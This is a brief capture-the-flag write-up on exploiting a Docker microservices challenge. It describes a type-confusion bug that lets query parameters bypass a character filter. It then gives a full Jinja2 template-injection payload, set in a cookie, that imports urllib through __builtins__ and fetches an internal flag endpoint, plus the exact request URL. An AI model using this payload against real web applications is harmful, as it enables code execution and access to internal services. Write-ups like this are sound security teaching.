# Microservices Revenge

This one's kinda funny

So there's this guy who has a bunch of microservices (docker containers), 4 this time, `gateway`, `home_page`, `admin_page`, and `flag_page`

`gateway` now has a few banned chars but will now also send the cookies over

`home_page` lets you put any html into the page, but its kinda useless

`admin_page` is even shorter now, but crucially it passes unsanitised data from cookies into `render_template_string`

`flag_page` has the flag but will only show it if you access this endpoint `/flag` which is not accessible with `gateway`

the banned characters mostly prevent template string shenanigans, so its a bit sus

but theres an error

in the `is_sus` function, the filter, its typed like this
```py
def is_sus(microservice: str, cookies: dict) -> bool
```
but is called like this
```py
if is_sus(request.args.to_dict(), request.cookies.to_dict()):
```

notice the first arg is decidedly not a `str`

so basically the filter works for cookies but not for query parameters

so we set `?code=_` (`_` is banned) and we can then access it from the cookie with `{% set us = request.args.code %}`

then we just use `urllib` to get the flag

in conclusion:
1. set cookie `user` to `
{% set us = request.args.code %} {% set urllib = request.application[us+us+"globals"+us+us][us+us+"builtins"+us+us][us+us+"import"+us+us]("urllib") %} {% set fp = urllib.request.urlopen("http://rflagpage/flag") %} {{ fp.read().decode() }} `
2. access the url `34.124.157.94:5005/?service=adminpage&code=_`

enjoy flag

:)